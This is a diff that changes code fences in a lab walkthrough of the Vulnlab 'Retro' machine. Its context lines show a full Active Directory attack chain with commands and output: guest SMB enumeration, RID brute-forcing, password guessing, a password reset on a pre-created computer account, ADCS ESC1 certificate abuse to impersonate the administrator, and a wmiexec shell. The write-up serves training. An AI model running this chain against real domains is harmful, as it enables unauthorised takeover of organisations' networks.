@@ -10,7 +10,7 @@ Retro is a easy machine on [Vulnlab](https://www.vulnlab.com/). It involves some
 
 As with every machine, let's start with an Nmap scan. I use my own Rust wrapper which you can find [here](https://github.com/qur1us/rustmap). Let's look at the results.
 
-```bash
+```
 Nmap scan report for 10.10.106.112
 Host is up (0.045s latency).
 
@@ -90,7 +90,7 @@ From the results we can see that we are probably dealing with a domain controlle
 
 The very first thing we have to do, is to acquire a `namingContext` for us to use in later LDAP queries as a base.
 
-```bash
+```
 ➜  retro ldapsearch -x -H ldap://10.10.106.112 -s base namingContexts
 # extended LDIF
 #
@@ -111,7 +111,7 @@ namingContexts: DC=ForestDnsZones,DC=retro,DC=vl
 
 With a proper  `namingContext` we can try null authentication and see if we can access the LDAP database.
 
-```bash
+```
 ➜  retro ldapsearch -x -H ldap://10.10.106.112 -s sub -b 'DC=retro,DC=vl'
 # extended LDIF
 #
@@ -137,7 +137,7 @@ Unfortunately, we need a valid set of credentials to interact with LDAP. Let's m
 
 Since LDAP has failed us, we can continue by enumerating SMB. The very first thing we can try is to provide blank credentials, however this time it fails. What we can do is to provide a username (any username) and a blank password for a guest session. Using `crackmapexec` we can see that it indeed works and we can list the shares.
 
-```bash
+```
 ➜  retro crackmapexec smb 10.10.106.112 -u 'guest' -p '' --shares
 SMB         10.10.106.112      445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
 SMB         10.10.106.112      445    DC               [+] retro.vl\guest: 
@@ -155,7 +155,7 @@ SMB         10.10.106.112      445    DC               Trainees        READ
 
 There are two shares that are not default: `Notes` and `Trainees`. However, we only have read permissions to read the Trainees share. We can use `impacket-smbclient` to use the explore the Trainees share.
 
-```bash
+```
 ➜  retro impacket-smbclient guest@10.10.106.112 -no-pass
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -169,7 +169,7 @@ drw-rw-rw-          0  Wed Jul 26 11:54:14 2023 ..
 
 Inside the share there is only one text file named `Important.txt` Let's take a look at it's contents.
 
-```bash
+```
 # cat important.txt
 Dear Trainees,
 
@@ -184,7 +184,7 @@ The Admins
 
 The admins apparently created one account for all trainees. Let's enumerate the account name by trying to brute force RIDs with `crackmapexec`.
 
-```bash
+```
 ➜  retro crackmapexec smb 10.10.106.112 -u 'guest' -p '' --rid-brute
 SMB         10.10.106.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
 SMB         10.10.106.112   445    DC               [+] retro.vl\guest: 
@@ -204,7 +204,7 @@ SMB         10.10.106.112   445    DC               1109: RETRO\tblack (SidTypeU
 
 We can see that there indeed exists a domain account named `trainee`. What we have to do now is to find a suitable password. We have to keep in mind the message `some of you seemed to struggle with remembering strong and unique passwords`. We can guess that this password will not be very strong and is probably easy to guess. Let's try something very basic such as username == password and if that fails we will attempt to create a wordlist.
 
-```bash
+```
 ➜  retro crackmapexec smb 10.10.106.112 -u 'trainee' -p 'trainee'
 SMB         10.10.106.112      445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
 SMB         10.10.106.112      445    DC               [+] retro.vl\Trainee:trainee
@@ -218,7 +218,7 @@ We can see that our first guess was correct and we get a successful login!
 
 Now that we own credentials to the `trainee` user, we have to figure out how to continue. Since there are LDAP and WINRM ports opened we can try them both.
 
-```bash
+```
 ➜  retro crackmapexec winrm 10.10.106.112 -u 'Trainee' -p 'trainee'
 SMB         10.10.106.112      5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:retro.vl)
 HTTP        10.10.106.112      5985   DC               [*] http://10.10.106.112:5985/wsman
@@ -237,7 +237,7 @@ Let's take a look at SMB again.
 
 As we can remember, there was one more non-standard share.
 
-```bash
+```
 ➜  retro crackmapexec smb 10.10.106.112 -u 'trainee' -p 'trainee' --shares
 SMB         10.10.106.112      445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
 SMB         10.10.106.112      445    DC               [+] retro.vl\trainee:trainee 
@@ -255,7 +255,7 @@ SMB         10.10.106.112      445    DC               Trainees        READ
 
 With the new set of credentials we gained additional read permissions to some shares. Let's use `impacket-smbclient` again.
 
-```bash
+```
 ➜  retro impacket-smbclient trainee:trainee@10.10.106.112
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -269,7 +269,7 @@ drw-rw-rw-          0  Wed Jul 26 11:54:14 2023 ..
 
 We have found another note. Let's take a look.
 
-```bash
+```
 # cat ToDo.txt
 Thomas,
 
@@ -290,7 +290,7 @@ After doing some research on pre-created computer accounts I found a great [blog
 
 From both the message and blog post it's clear that we are looking for a specific computer account with appropriate attributes set. We can use `crackmapexec` with the `--rid-brute` flag again.
 
-```bash
+```
 ➜  retro crackmapexec smb 10.10.106.112 -u 'trainee' -p 'trainee' --rid-brute
 SMB         10.10.106.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
 SMB         10.10.106.112   445    DC               [+] retro.vl\trainee:trainee 
@@ -312,7 +312,7 @@ This looks promising. We have found two domain computer accounts. One is `DC$` a
 
 Let's check with `crackmapexec`.
 
-```bash
+```
 ➜  retro crackmapexec smb 10.10.106.112 -u 'BANKING$' -p 'banking'    
 SMB         10.10.106.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
 SMB         10.10.106.112   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
@@ -329,7 +329,7 @@ This is expected as we have to change the account password as the article sugges
 
 To change the password we can use `impacket-changepasswd` script. The article also mentions using RPC over SMB as it results in errors. We can do so with the `-p rpc-samr` flag.
 
-```bash
+```
 ➜  retro impacket-changepasswd 'retro.vl/BANKING$':banking@10.10.106.112 -newpass Password123456 -dc-ip 10.10.106.112 -p rpc-samr
 Impacket v0.11.0 - Copyright 2023 Fortra
 
@@ -340,7 +340,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 And we can confirm that we indeed have changed the `BANKING$` account password.
 
-```bash
+```
 ➜  retro crackmapexec smb 10.10.106.112 -u 'BANKING$' -p 'Password123456'         
 SMB         10.10.106.112   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
 SMB         10.10.106.112   445    DC               [+] retro.vl\BANKING$:Password123456
@@ -352,7 +352,7 @@ SMB         10.10.106.112   445    DC               [+] retro.vl\BANKING$:Passwo
 
 What we can do next is to check whether the `retro.vl` uses Active Directory Certificate Services. We can check with `certipy`.
 
-```bash
+```
 ➜  retro certipy find -u 'BANKING$'@retro.vl -p Password123456 -dc-ip 10.10.106.112 -stdout
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -399,7 +399,7 @@ Let's use `certipy` again with the `-vulnerable` switch to list vulnerable certi
 
 Let's tak a look if we can find some vulnerable templates that would allow us to elevate our privileges in the domain.
 
-```bash
+```
 ➜  retro certipy find -vulnerable -u 'BANKING$'@retro.vl -p Password123456 -dc-ip 10.10.106.112 -stdout
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -481,7 +481,7 @@ As we can see `certipy` has flagged one template vulnerable to ESC1. `RetroClien
 
 ESC1 allows us to request a certificate and supply the subject SPN. This is due to the `EnrolleeSuppliesSubject` flag set. We can use `certipy` again and request a administrator certificate.
 
-```bash
+```
 ➜  retro certipy req -u 'BANKING$'@retro.vl -p Password123456 -dc-ip 10.10.106.112 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl               
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -494,7 +494,7 @@ Unfortunately, this has failed with the `CERTSRV_E_KEY_LENGTH` which means that 
 
 Fortunately, `certipy` allows us to set the RSA key length with the `-key-size` flag.
 
-```bash
+```
 ➜  retro certipy req -u 'BANKING$'@retro.vl -p Password123456 -dc-ip 10.10.106.112 -ca retro-DC-CA -template RetroClients -upn administrator@retro.vl -key-size 4096
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -508,7 +508,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 We can see that this indeed work and we can now use `auth` module of `certipy` to get a valid TGT as administrator.
 
-```bash
+```
 ➜  retro certipy auth -pfx administrator.pfx -dc-ip 10.10.106.112                                                                       
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -526,7 +526,7 @@ We now own a administrator certificate which we can use to authenticate to the d
 
 Getting shell from this point is a piece of cake. We can use `impacket-wmiexec` to get a semi-interactive shell and execute commands on the domain controller as administrator.
 
-```bash
+```
 ➜  retro KRB5CCNAME=administrator.ccache impacket-wmiexec -k -no-pass -dc-ip 10.10.106.112 retro.vl/administrator@dc.retro.vl
 Impacket v0.11.0 - Copyright 2023 Fortra
 
